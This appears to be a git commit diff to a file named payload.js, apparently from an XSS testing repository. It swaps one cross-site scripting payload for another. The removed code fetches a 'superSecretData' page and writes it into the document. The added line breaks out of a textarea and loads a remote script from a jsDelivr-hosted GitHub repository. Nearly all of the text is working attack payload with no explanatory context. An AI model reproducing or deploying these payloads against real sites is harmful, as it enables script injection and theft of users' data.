f893557b99660817ced53e2efb86f5e389f43b73
rishaldwivedi <rishal.dwivedi@gmail.com>
2025-06-25 04:34:20 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,5 +1,1 @@
-fetch("/app/superSecretData.html")
-  .then(res => res.text())
-  .then(data => {
-    document.body.innerHTML += "<hr><h2>Super Secret Data</h2><pre>" + data + "</pre>";
-  });
+</textarea><script src="https://cdn.jsdelivr.net/gh/rishaldwivedi/testxss@main/payload.js"></script>
